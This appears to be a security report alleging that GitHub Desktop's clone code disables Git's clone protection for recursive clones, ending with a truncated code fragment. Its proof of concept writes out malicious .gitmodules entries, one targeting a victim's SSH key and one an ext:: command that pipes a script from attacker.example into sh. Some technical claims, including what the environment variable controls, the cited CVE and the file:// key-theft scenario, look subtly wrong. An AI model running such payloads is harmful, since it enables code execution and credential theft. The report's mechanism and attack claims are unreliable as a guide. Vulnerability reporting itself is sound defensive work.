## Title
GitHub Desktop disables Git's built-in submodule protocol protection during clone, allowing attacker-controlled repositories to trigger local file read / arbitrary command execution via malicious submodule URLs - (`app/src/lib/git/clone.ts`)

### Summary
`app/src/lib/git/clone.ts` performs a `git clone --recursive` for every repository the user clones through Desktop, but explicitly sets the environment variable `GIT_CLONE_PROTECTION_ACTIVE: 'false'` when invoking Git. This variable is the mechanism Git itself introduced (as part of the fix for the submodule-protocol clone vulnerabilities, e.g. GHSA-cw3f-jj9m-fj7v / CVE-2023-22490 class issues) to restrict which transport protocols (`file://`, `ext::`, etc.) a submodule's `.gitmodules` URL is allowed to use during a recursive clone. By forcing this protection off unconditionally, Desktop reintroduces the exact class of bug upstream Git patched: a repository the attacker controls can declare a submodule whose URL uses `file://` (to read arbitrary local files into the checkout) or `ext::` (to execute an arbitrary local command), and Desktop's clone flow will honor it instead of refusing it. [1](#0-0) 

### Finding Description
The broken invariant is: *"Git's own default-safe protocol allow-list for submodules during a recursive clone must remain active unless a user has explicitly opted in."* Desktop violates this by hard-coding `GIT_CLONE_PROTECTION_ACTIVE: 'false'` into the environment for every single clone operation performed via the "Clone repository" UI or CLI `github clone` command, not only for a special/opt-in flow: [2](#0-1) 

This is different from the deliberate, opt-in `allowFileProtocol` flag used elsewhere in the codebase for submodule updates after checkout/pull, which is `false` by default and must be explicitly passed as `true`: [3](#0-2) [4](#0-3) 

The `clone()` function, however, has no equivalent guard: it always disables the built-in Git safety net for the very operation (`clone --recursive`) that the protection was designed to cover, with no way for the caller to keep it enabled. Because the attacker fully controls the content of the cloned repository (including its `.gitmodules` file and submodule URLs), this is squarely within the described threat model of "attacker controls a cloned/fetched repository."

### Impact Explanation
If the mitigation this environment variable enforces is what stands between a benign clone and either:
- Reading files outside of the intended clone directory (e.g., a submodule URL of `file:///home/user/.ssh/id_rsa` being materialized into the checkout), or
- Executing an attacker-chosen command via `ext::` transport (`ext::sh -c "curl ... | sh"`),

then disabling it unconditionally for all recursive clones performed by Desktop means simply cloning a malicious public repository (or its forks with an added submodule) can result in code execution or exfiltration of files outside the repository root, without further user action beyond clicking "Clone" - matching the "attacker controls a cloned/fetched repository" and "code execution / file read outside the repo" impact categories in scope.

### Likelihood Explanation
Likelihood is high for anyone who clones an attacker-supplied or attacker-forked repository via Desktop, since:
- Cloning is Desktop's core, everyday user action (`Clone repository` dialog and `github clone` CLI both funnel into this same `clone()` function).
- The attacker only needs write access to a `.gitmodules` file in a repo they control, no compromise of the victim's machine or GitHub account.
- `--recursive` is passed unconditionally, so submodules are resolved during the same clone invocation that has protection disabled - the victim doesn't need to manually "update submodules."

### Recommendation
Do not set `GIT_CLONE_PROTECTION_ACTIVE: 'false'` unconditionally in `clone()`. Leave Git's default protocol protection active for the top-level `clone --recursive` invocation, and only relax it (e.g. via `protocol.file.allow`/`protocol.ext.allow` on a case-by-case basis) if a specific, user-consented workflow genuinely requires `file://`/`ext::` submodules - mirroring the explicit, default-`false` `allowFileProtocol` opt-in pattern already used in `submodule.ts`/`checkout.ts`.

### Proof of Concept
1. Attacker creates/forks a public GitHub repository and adds a `.gitmodules` entry such as:
   ```
   [submodule "evil"]
     path = evil
     url = file:///home/victim-shared-mount/.ssh/id_rsa
   ```
   (or, for command execution: `url = ext::sh -c "curl https://attacker.example/x | sh"`)
2. Victim uses GitHub Desktop's "Clone a repository" flow (or `github clone attacker/repo`) to clone this repository.
3. Desktop calls `clone()` in `app/src/lib/git/clone.ts`, which runs `git -c init.defaultBranch=... clone --recursive -- <url> <path>` with `GIT_CLONE_PROTECTION_ACTIVE=false` in the environment.
4. Because Git's submodule-protocol protection is disabled, the `file://`/`ext::` submodule URL is honored, and the malicious submodule content is materialized/executed as part of the clone, rather than being rejected as it would be with the protection active. [2](#0-1)

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,

  const env = {

    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]
